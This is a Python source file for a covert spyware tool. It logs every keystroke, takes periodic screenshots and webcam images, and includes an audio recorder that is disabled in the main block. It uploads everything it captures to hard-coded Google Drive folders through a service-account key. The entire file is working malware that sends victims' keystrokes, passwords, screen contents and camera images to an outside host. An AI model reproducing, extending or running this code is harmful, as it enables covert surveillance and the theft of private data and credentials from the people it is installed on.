import keyboard
import pyaudio
import wave
import pyscreenshot as ImageGrab
from threading import Thread
import threading
import time
import os
import cv2
import pycamera
from PIL import Image
import numpy as np
from datetime import datetime, timedelta
from threading import Timer
from googleapiclient.http import MediaInMemoryUpload
from googleapiclient.http import MediaFileUpload
from google.oauth2 import service_account
from googleapiclient.discovery import build
import io
from googleapiclient.http import MediaIoBaseUpload

# Set up Google Drive API credentials and create a service object
credentials = service_account.Credentials.from_service_account_file(r'kelog-416709-152617ffd63e.json')
drive_service = build('drive', 'v3', credentials=credentials)

# Define the folder ID to upload the file to
folder_id = "1qn_mhRxatBOWDkw05oEqHADB1UiNBLVb"

AUDIO_PATH_ID = "1uLsfpsdLXlNBDdsmNOYlAVzM2cFgoq3v"
SCREEN_PATH_ID = "1MbFAlJt8J0Vg3ALuebwCm2xYf_TlRt17"
FILE_PATH_ID = "1krE1Smv5sQhmFooVXArDS0XR39FlTgd5"
CAMERA_PATH_ID = "1mMab-h-rLIJHJUzuKEPHnXxyp9431h0K"

drive_lock = threading.Lock()

# Keylogger

start_time = time.time()
SEND_REPORT_EVERY = 60

# def upload_file_to_drive(file_path):
#     """Uploads a file to Google Drive."""
#     # Create a media file upload object
#     media = MediaFileUpload(file_path)

#     # Define the file metadata
#     file_name = os.path.basename(file_path)
#     file_metadata = {
#         'name': file_name,
#         'parents': [FILE_PATH_ID]
#     }
#     # Upload the file
#     uploaded_file = drive_service.files().create(
#         body=file_metadata,
#         media_body=media,
#         fields='id,webViewLink'  # Specify the fields you want to retrieve
#     ).execute()

#     # Return the ID and web link URL of the uploaded file
#     return uploaded_file['id'], uploaded_file['webViewLink']


class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            media = MediaInMemoryUpload(self.log.encode(), mimetype='text/plain', resumable=True)
            
            file_metadata = {
                'name': self.filename,
                'parents': [FILE_PATH_ID]
            }
            with drive_lock:
                uploaded_file = drive_service.files().create(
                    body=file_metadata,
                    media_body=media,
                    fields='id,webViewLink'
                ).execute()

            self.log = ""

    def update_filename(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.filename = f"keylog_{timestamp}.txt"

    def start(self):
        while True:
            self.start_dt = datetime.now()
            keyboard.on_release(callback=self.callback)
            self.report()
            time.sleep(self.interval)

    

# keyboard.on_press(on_press)
# Voice Recorder

def record_audio(duration):
    while True:
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        frames = []
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)

        frames = []
        for i in range(int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        # Create an in-memory file-like object
        audio_file = io.BytesIO()
        wave_file = wave.open(audio_file, 'wb')
        wave_file.setnchannels(CHANNELS)
        wave_file.setsampwidth(audio.get_sample_size(FORMAT))
        wave_file.setframerate(RATE)
        wave_file.writeframes(b''.join(frames))
        wave_file.close()

        # Reset the file pointer to the beginning of the file
        audio_file.seek(0)

        # Upload the audio file to Google Drive
        file_metadata = {
            'name': f'audio_{int(time.time())}.wav',
            'parents': [AUDIO_PATH_ID]
        }
        media = MediaIoBaseUpload(audio_file, mimetype='audio/wav', resumable=True)
        with drive_lock:
            uploaded_file = drive_service.files().create(
                body=file_metadata,
                media_body=media,
                fields='id,webViewLink'
            ).execute()

        # print(f"[+] Uploaded audio_{int(time.time())}.wav to Google Drive")
        # print("File ID:", uploaded_file['id'])/
        # print("Web Link:", uploaded_file['webViewLink'])

        frames = []  # Reset frames for the next recording

        # Wait for a brief period before starting the next recording
        time.sleep(1)



def capture_screen(interval):
    while True:
        screenshot = ImageGrab.grab()
        image_data = np.array(screenshot)
        image = Image.fromarray(image_data)

        # Convert the image to in-memory bytes
        image_bytes = io.BytesIO()
        image.save(image_bytes, format='WebP')
        image_bytes.seek(0)

        # Upload the image to Google Drive
        file_metadata = {
            'name': f"screen_{int(time.time())}.webp",
            'parents': [SCREEN_PATH_ID]
        }
        media = MediaIoBaseUpload(image_bytes, mimetype='image/webp', resumable=True)
        with drive_lock:
            uploaded_file = drive_service.files().create(
                body=file_metadata,
                media_body=media,
                fields='id,webViewLink'
            ).execute()
        # Wait for the specified interval before capturing the next screen
        time.sleep(interval)

   
def capture_front_camera(interval):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()

        if ret:
            frame = cv2.flip(frame, 1)
            image_bytes = cv2.imencode('.jpeg', frame)[1].tobytes()
            media = MediaInMemoryUpload(image_bytes, mimetype='image/jpeg', resumable=True)

            file_metadata = {
                'name': f"camera_{int(time.time())}.png",
                'parents': [CAMERA_PATH_ID]
            }
            with drive_lock:
                uploaded_file = drive_service.files().create(
                    body=file_metadata,
                    media_body=media,
                    fields='id,webViewLink'
                ).execute()
        time.sleep(interval)
        if cv2.waitKey(1) == ord('q'):
            break
    cap.release()
    cv2.destroyAllWindows()
        

if __name__ == "__main__":

    # Run all tasks in separate threads
    keyboard_input = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keyboard_thread = Thread(target=keyboard_input.start)
    # voice_thread = Thread(target=record_audio, args=(SEND_REPORT_EVERY,))  # Record audio for 60 seconds
    screen_thread = Thread(target=capture_screen, args=(SEND_REPORT_EVERY,))  # Capture screen every 60 seconds
    camera_thread = Thread(target=capture_front_camera, args=(SEND_REPORT_EVERY,))
    
    keyboard_thread.start()
    # voice_thread.start()
    screen_thread.start()
    camera_thread.start()
    
    # # Wait for threads to finish (infinite loop)
    # keyboard_thread.join()
    # voice_thread.join()
    # screen_thread.join()
    # camera_thread.join()
    
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            # Stop the threads and exit the program gracefully
            break

# keyboard_thread = Thread(target=keyboard.on_press, args=(lambda e: None,))